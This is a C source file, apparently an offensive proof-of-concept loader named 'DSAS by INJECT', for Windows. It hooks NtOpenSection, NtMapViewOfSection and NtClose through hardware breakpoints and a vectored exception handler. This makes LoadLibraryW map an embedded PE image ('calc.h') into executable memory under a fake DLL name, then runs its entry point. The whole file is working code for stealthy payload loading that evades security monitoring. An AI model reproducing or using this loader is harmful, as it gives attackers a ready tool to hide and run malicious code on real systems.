// DSAS by INJECT

#include <Windows.h>
#include "loader.h"
//#include "gmh.h"
#include "calc.h"

#define DLL_NAME L"fakedll.dll"


bool prepare(ULONG_PTR func_addr, CONTEXT* context, PLL_WRAPPER lwe);

#define RET_INSTRUCTION 0xC3 // 0xC2 for wow64 ntdll

LONG veh (PEXCEPTION_POINTERS ExceptionInfo) {

    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) { //HWBP

        PLL_WRAPPER lwe = (PLL_WRAPPER)ExceptionInfo->ContextRecord->Dr3;

        if(lwe->status == ZwOpenSection) {
            DPRINT("lwe->status == ZwOpenSection");

            WCHAR              NameBuffer[MAX_PATH*2];
            UNICODE_STRING     ObjectName;
            ULONG              ReturnLength = 0;
            PUNICODE_STRING    TempName;
            POBJECT_ATTRIBUTES ObjectAttr = (POBJECT_ATTRIBUTES)ExceptionInfo->ContextRecord->R8; //3rd arg
            DPRINT("ObjectAttr->ObjectName: %ws", ObjectAttr->ObjectName->Buffer);
            DPRINT("ObjectAttr->RootDirectory: %p", ObjectAttr->RootDirectory);

            TempName = ObjectAttr->ObjectName; // save tempname
            
            if(lwe->pRtlCompareUnicodeString(TempName, &lwe->DllName, TRUE))
              lwe->pZwContinue(ExceptionInfo->ContextRecord, FALSE);

            ObjectName.Buffer = NameBuffer; // init ObjectName
            ObjectName.Length = MAX_PATH*2;
            ObjectName.MaximumLength = MAX_PATH*2;
            
            if(lwe->pZwQueryObject(ObjectAttr->RootDirectory, ObjectNameInformation, &ObjectName, MAX_PATH*2 + sizeof(UNICODE_STRING), NULL) != 0x00) {
              lwe->pZwContinue(ExceptionInfo->ContextRecord, FALSE);
            }
            DPRINT("ObjectName.Buffer: %ws", ObjectName.Buffer);
            if(lwe->pRtlCompareUnicodeString(&ObjectName, &lwe->Directory, TRUE)) { //check if it's knowndlls
              if(lwe->pRtlCompareUnicodeString(&ObjectName, &lwe->Directory32, TRUE)) {
                lwe->pZwContinue(ExceptionInfo->ContextRecord, FALSE);
              }
            }

            ULONG_PTR* hSection = (ULONG_PTR*)ExceptionInfo->ContextRecord->Rcx; // ptr to section handle 
      
            *hSection = (ULONG_PTR)lwe->hSection; // change
            DPRINT("Changed hSection to: %llu", *hSection);

            BYTE ret = 0;
            PBYTE func_base = (PBYTE)ExceptionInfo->ContextRecord->Rip;
            while(*func_base != RET_INSTRUCTION){
              func_base++;
              ret++;
            } //find ret to skip ZwOpenSection

            ExceptionInfo->ContextRecord->Rax = 0;
            ExceptionInfo->ContextRecord->Rip += ret;

            lwe->status = ZwMapViewOfSection;
            prepare((ULONG_PTR)lwe->pZwMapViewOfSection, ExceptionInfo->ContextRecord, lwe);

			      lwe->pZwContinue(ExceptionInfo->ContextRecord, FALSE);
          
        }

        
        if(lwe->status == ZwMapViewOfSection) {

            DPRINT("lwe->status == ZwMapViewOfSection");

            ULONG_PTR  hSection = (ULONG_PTR)ExceptionInfo->ContextRecord->Rcx;
            HANDLE     hProcess = (HANDLE)ExceptionInfo->ContextRecord->Rdx;
            ULONG_PTR *BaseAddress = (ULONG_PTR *)ExceptionInfo->ContextRecord->R8;

            ULONG_PTR* RSP = (ULONG_PTR*)ExceptionInfo->ContextRecord->Rsp;

            ULONG     *AllocationType = (ULONG*)((char*)RSP + 9 * 8);
            ULONG     *Protection = (ULONG*)((char*)RSP + 10 * 8);

            #ifdef DEBUG

            ULONG_PTR ZeroBits = (ULONG_PTR)ExceptionInfo->ContextRecord->R9;
            SIZE_T *CommitSize = (SIZE_T*)((char*)RSP + 5 * 8);
            PLARGE_INTEGER *SectionOffset = (PLARGE_INTEGER*)((char*)RSP + 6 * 8);
			      PSIZE_T* size = (SIZE_T**)((char*)RSP + 7 * 8);
            ULONG *InheritDisposition = (ULONG*)((char*)RSP + 8 * 8);
            #endif
            
            if(hSection != (ULONG_PTR)lwe->hSection) {
                DPRINT("Section handle is not equal to pre-created one");
                DPRINT("Section handle: %p", hSection);
                lwe->pZwContinue(ExceptionInfo->ContextRecord, FALSE);
            }
            if(hProcess != NtCurrentProcess()) {
              DPRINT("Process handle is not equal to current process handle (pseudo)");
              DPRINT("Process handle: %p", hProcess);
              lwe->pZwContinue(ExceptionInfo->ContextRecord, FALSE);
            }

            if(hSection == (ULONG_PTR)lwe->hSection && hProcess == NtCurrentProcess()) {
                DPRINT("Handle of section is equal to pre-created section handle, and the process handle is ours.");
                *AllocationType = 0; // Cause there will be always SEC_FILE, we don't need that
                *Protection = PAGE_EXECUTE_READWRITE; // :(. u can write handler to set proper protections inside veh handler, but there's rwx map
                *BaseAddress = (ULONG_PTR)lwe->DllBase;
                
                DPRINT("ZwMapViewOfSection: SECTION HANDLE: %p, PROCESS HANDLE: %p, BASE ADDRESS: %p, ZeroBits: %llu, CommitSize: %llu, SectionOffset: %p, VIEW SIZE: %llu, InheritDisposition: %lu, AllocationType: %lu, Win32Protect: %lu", \
                hSection, hProcess, *BaseAddress, ZeroBits, *CommitSize, *SectionOffset, **size, *InheritDisposition, *AllocationType, *Protection);

                
                lwe->status = ZwClose;
                prepare(lwe->pZwClose, ExceptionInfo->ContextRecord, lwe);
                lwe->pZwContinue(ExceptionInfo->ContextRecord, FALSE);
            }
        }
        
        if(lwe->status == ZwClose) {
            DPRINT("lwe->status == ZwClose");
            ULONG_PTR handle = (ULONG_PTR)ExceptionInfo->ContextRecord->Rcx;
            
            if(handle == (ULONG_PTR)lwe->hSection) {
                DPRINT("Handle of section is equal to pre-created section handle!");
                DPRINT("ZwClose: section handle: %llu", handle);
                lwe->status = End;
                lwe->pZwContinue(ExceptionInfo->ContextRecord, FALSE);
            }
            else {
                DPRINT("Handle of section is not equal to pre-created section handle.");
                DPRINT("ZwClose: section handle: %llu", handle);
                ExceptionInfo->ContextRecord->EFlags |= 0x10000;
                lwe->pZwContinue(ExceptionInfo->ContextRecord, FALSE);
            }
            

        }
        if(lwe->status == End) {
            DPRINT("lwe->status == End");
            ExceptionInfo->ContextRecord->Dr0 = 0;
            ExceptionInfo->ContextRecord->Dr1 = 0;
            ExceptionInfo->ContextRecord->Dr2 = 0;
            ExceptionInfo->ContextRecord->Dr3 = 0;
            ExceptionInfo->ContextRecord->Dr6 = 0;
            ExceptionInfo->ContextRecord->Dr7 = 0;
            ExceptionInfo->ContextRecord->EFlags |= 0x10000;
            lwe->pZwContinue(ExceptionInfo->ContextRecord, FALSE);
        }

        lwe->pZwContinue(ExceptionInfo->ContextRecord, FALSE);
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

bool prepare(ULONG_PTR func_addr, CONTEXT* context, PLL_WRAPPER lwe) {

	if(!context) {
        context = (PCONTEXT)lwe->pRtlAllocateHeap(NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap, 0, sizeof(CONTEXT));
        context->ContextFlags = CONTEXT_DEBUG_REGISTERS;

        lwe->pZwGetContextThread(NtCurrentThread(), context);

        context->Dr7 = 1 << 0;
        context->Dr3 = (ULONG_PTR)lwe; // storing a pointer to a structure in в Dr3, because there is nothing important there
        context->Dr0 = func_addr; 

        lwe->pZwContinue(context, FALSE);
		    lwe->pRtlFreeHeap(NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap, 0, context);
    }
    else{
    
        context->Dr7 = 1 << 0;
        context->Dr3 = (ULONG_PTR)lwe; // storing a pointer to a structure in в Dr3, because there is nothing important there
		    context->Dr0 = func_addr;
        lwe->pZwContinue(context, FALSE);

    }

	return true;
}


bool LdrConvertFileToImage(PLL_WRAPPER lwe, PVOID ImageBase, PVOID MapAddress, BOOL has_reloc) {

    PIMAGE_DOS_HEADER      dos = (PIMAGE_DOS_HEADER)ImageBase;
    PIMAGE_NT_HEADERS      nt = RVA2VA(PIMAGE_NT_HEADERS, ImageBase, dos->e_lfanew);
    PIMAGE_NT_HEADERS      ntnew = RVA2VA(PIMAGE_NT_HEADERS, MapAddress, dos->e_lfanew);
    PIMAGE_SECTION_HEADER  sh;
    PBYTE                  ofs;
    PIMAGE_RELOC           list;
    PIMAGE_BASE_RELOCATION ibr;
    DWORD                  rva, size;

    size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

    DPRINT("Copying Headers");
    DPRINT("nt->FileHeader.SizeOfOptionalHeader: %d", nt->FileHeader.SizeOfOptionalHeader);
    DPRINT("nt->OptionalHeader.SizeOfHeaders: %d", nt->OptionalHeader.SizeOfHeaders);
    DPRINT("Copying %d bytes", nt->OptionalHeader.SizeOfHeaders);

    mem_copy(MapAddress, ImageBase, nt->OptionalHeader.SizeOfHeaders);

    DPRINT("DOS Signature (Magic): %08lx, %p", ((PIMAGE_DOS_HEADER)MapAddress)->e_magic, &(((PIMAGE_DOS_HEADER)MapAddress)->e_magic));
    DPRINT("NT Signature: %lx, %p", ntnew->Signature, &(ntnew->Signature));

    DPRINT("Copying each section to memory %p", MapAddress);

    sh = IMAGE_FIRST_SECTION(ntnew);
    for(int i=0; i<ntnew->FileHeader.NumberOfSections; i++) 
    {
      PBYTE dest = (PBYTE)MapAddress + sh[i].VirtualAddress;
      PBYTE source = (PBYTE)ImageBase + sh[i].PointerToRawData;

      if (sh[i].SizeOfRawData == 0)
        DPRINT("Section is empty of data, but may contain uninitialized data.");
      
      // Copy the section data
      mem_copy(dest,
          source,
          sh[i].SizeOfRawData);
      
      // Update the actual address of the section
      sh[i].Misc.PhysicalAddress = (DWORD)*dest;

      DPRINT("Copied section name: %s", sh[i].Name);
      DPRINT("Copied section source offset: 0x%X", sh[i].VirtualAddress);
      DPRINT("Copied section dest offset: 0x%X", sh[i].PointerToRawData);
      DPRINT("Copied section absolute address: 0x%lX", sh[i].Misc.PhysicalAddress);
      DPRINT("Copied section size: 0x%lX", sh[i].SizeOfRawData);
    }

    DPRINT("Sections copied.");

    if(!lwe->is_dll) {
        DPRINT("File is exe, changing characteristics in FileHeader and nulling EP.");
        DWORD null = 0;
        ntnew->FileHeader.Characteristics = ntnew->FileHeader.Characteristics | IMAGE_FILE_DLL;
        mem_copy(&ntnew->OptionalHeader.AddressOfEntryPoint, &null, sizeof(DWORD));
    }

    ntnew->OptionalHeader.ImageBase = (ULONG_PTR)MapAddress;

    ofs  = (PBYTE)MapAddress - nt->OptionalHeader.ImageBase;
    //relocs 
    if (ofs != 0 && has_reloc) 
    {
      DPRINT("Applying Relocations");
      
      rva  = ntnew->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
      ibr = RVA2VA(PIMAGE_BASE_RELOCATION, MapAddress, rva);
      
      while ((PBYTE)ibr < ((PBYTE)MapAddress + rva + size) && ibr->SizeOfBlock != 0) {
        list = (PIMAGE_RELOC)(ibr + 1);
  
        while ((PBYTE)list != (PBYTE)ibr + ibr->SizeOfBlock) {
          // check that the RVA is within the boundaries of the PE
          if (ibr->VirtualAddress + list->offset < ntnew->OptionalHeader.SizeOfImage) {
            PULONG_PTR address = (PULONG_PTR)((PBYTE)MapAddress + ibr->VirtualAddress + list->offset);
            if (list->type == IMAGE_REL_BASED_DIR64) {
              *address += (ULONG_PTR)ofs;
            } else if (list->type == IMAGE_REL_BASED_HIGHLOW) {
              *address += (DWORD)(ULONG_PTR)ofs;
            } else if (list->type == IMAGE_REL_BASED_HIGH) {
              *address += HIWORD(ofs);
            } else if (list->type == IMAGE_REL_BASED_LOW) {
              *address += LOWORD(ofs);
            } else if (list->type != IMAGE_REL_BASED_ABSOLUTE) {
              DPRINT("ERROR: Unrecognized Relocation type %08lx.", list->type);
              return false;
            }
          }
          list++;
        }
        ibr = (PIMAGE_BASE_RELOCATION)list;
      }
    }

    return true;
}

PVOID LdrCreateImageSection(PLL_WRAPPER lwe, PVOID ImageBase) {

    LARGE_INTEGER     sec_size;
    OBJECT_ATTRIBUTES ObjAttr;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ImageBase;
    PIMAGE_NT_HEADERS nt = RVA2VA(PIMAGE_NT_HEADERS, ImageBase, dos->e_lfanew);
    DWORD             size, rva;
    ULONG_PTR         NewImageBase;
    HANDLE            LHandle = NULL;
    SIZE_T            ViewSize;
    PVOID             MapAddress = NULL;
    NTSTATUS          STATUS;
    BOOL              has_reloc;



    lwe->entrypoint = nt->OptionalHeader.AddressOfEntryPoint; // save Ep in LL_WRAPPER struct

    if(!(nt->FileHeader.Characteristics & IMAGE_FILE_DLL)) // check if PE is DLL
      lwe->is_dll = FALSE;
    else
      lwe->is_dll = TRUE;
    

    sec_size.QuadPart = nt->OptionalHeader.SizeOfImage;
    ViewSize = nt->OptionalHeader.SizeOfImage;

    // check if the binary has relocation information
    size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    has_reloc = size == 0? FALSE : TRUE;
    if (!has_reloc)
    {
      DPRINT("No relocation information present, setting the base to: 0x%p", (PVOID)nt->OptionalHeader.ImageBase);
      MapAddress = (PVOID)nt->OptionalHeader.ImageBase;
    }


    InitializeObjectAttributes(&ObjAttr, 0, 0, 0, 0);

    STATUS = lwe->pZwCreateSection(&LHandle, SECTION_ALL_ACCESS, &ObjAttr, &sec_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0);
    if(!NT_SUCCESS(STATUS)){
        DPRINT("Unable to create section. NSTATUS: %lu", STATUS);
        return NULL;
    }

    STATUS = lwe->pZwMapViewOfSection(LHandle, NtCurrentProcess(), &MapAddress, 0, 0, NULL, &ViewSize, ViewShare, NULL, PAGE_READWRITE);
    if(!NT_SUCCESS(STATUS) && !has_reloc) {
        DPRINT("Unable to map view of section on preferred base. Trying to map at random base. NSTATUS: %lu", STATUS); // relevant only for x64 binaries
        MapAddress = NULL;
        STATUS = lwe->pZwMapViewOfSection(LHandle, NtCurrentProcess(), &MapAddress, 0, 0, NULL, &ViewSize, ViewShare, NULL, PAGE_READWRITE);
        if(!NT_SUCCESS(STATUS)) {
          DPRINT("Fuck it. NTSTATUS: %lu", STATUS);
          return NULL;
        }
    }

    LdrConvertFileToImage(lwe, ImageBase, MapAddress, has_reloc);
    
    STATUS = lwe->pZwUnmapViewOfSection(NtCurrentProcess(), MapAddress);
    if(!NT_SUCCESS(STATUS)) {
        DPRINT("Unable to Unmap view of section. NSTATUS: %lu", STATUS);
        return NULL;
    }
    
    DPRINT("Created section handle: %p", LHandle);

    lwe->hSection = LHandle; // save section handle

    lwe->DllBase = MapAddress; // save base address

    return MapAddress;
}

int main(void) {

    HMODULE        ntdll = GetModuleHandleA("ntdll.dll");

    HANDLE         hSection = NULL, hModule = NULL;
    LL_WRAPPER     lwe;
    PVOID          DllBase;
    PVOID          entrypoint;
    //init apis
    lwe.pRtlCompareUnicodeString = (TD_RtlCompareUnicodeString) GetProcAddress(ntdll, "RtlCompareUnicodeString");
    lwe.pRtlCreateUnicodeString  = (TD_RtlCreateUnicodeString)  GetProcAddress(ntdll, "RtlCreateUnicodeString");
    lwe.pRtlAllocateHeap         = (TD_RtlAllocateHeap)         GetProcAddress(ntdll, "RtlAllocateHeap");
    lwe.pZwGetContextThread      = (TD_NtGetContextThread)      GetProcAddress(ntdll, "NtGetContextThread");
    lwe.pRtlFreeHeap             = (TD_RtlFreeHeap)             GetProcAddress(ntdll, "RtlFreeHeap");
    lwe.pZwContinue              = (TD_NtContinue)              GetProcAddress(ntdll, "NtContinue");
    lwe.pZwCreateSection         = (TD_NtCreateSection)         GetProcAddress(ntdll, "NtCreateSection");
    lwe.pZwUnmapViewOfSection    = (TD_NtUnmapViewOfSection)    GetProcAddress(ntdll, "NtUnmapViewOfSection");
    lwe.pZwOpenSection           = (ULONG_PTR)                  GetProcAddress(ntdll, "NtOpenSection");
    lwe.pZwMapViewOfSection      = (TD_NtMapViewOfSection)      GetProcAddress(ntdll, "NtMapViewOfSection");
    lwe.pZwClose                 = (ULONG_PTR)                  GetProcAddress(ntdll, "NtClose");
    lwe.pZwQueryObject           = (TD_NtQueryObject)           GetProcAddress(ntdll, "NtQueryObject");
    //init required strings
    lwe.pRtlCreateUnicodeString(&lwe.Directory,   L"\\KnownDlls");
    lwe.pRtlCreateUnicodeString(&lwe.Directory32, L"\\KnownDlls32");
    lwe.pRtlCreateUnicodeString(&lwe.DllName, DLL_NAME);

    //create image section
    if(!LdrCreateImageSection(&lwe, rawData)){
      DPRINT("Unable to create Image section from raw PE. Something wrong...");
      return -1;
    }

    lwe.status = ZwOpenSection;
    // add veh handler
    PVOID hVeh = AddVectoredExceptionHandler(1, veh);
    // set hwbp
    prepare(lwe.pZwOpenSection, NULL, &lwe);
    //lesgoo 
    hModule = LoadLibraryW(DLL_NAME);

    RemoveVectoredExceptionHandler(hVeh);

    DPRINT("Module base: %p", hModule);

    //fix if it's .exe
    if(!lwe.is_dll) {
      DPRINT("Your file is .exe, so it's required to update ImageBaseAddress in PEB with loaded .exe");
      NtCurrentTeb()->ProcessEnvironmentBlock->ImageBaseAddress = hModule;
      entrypoint = RVA2VA(PVOID, hModule, lwe.entrypoint);
      DPRINT("Executing .exe entrypoint: %p", entrypoint);
      ((void(*)())entrypoint)();
    }

    return 0;

}   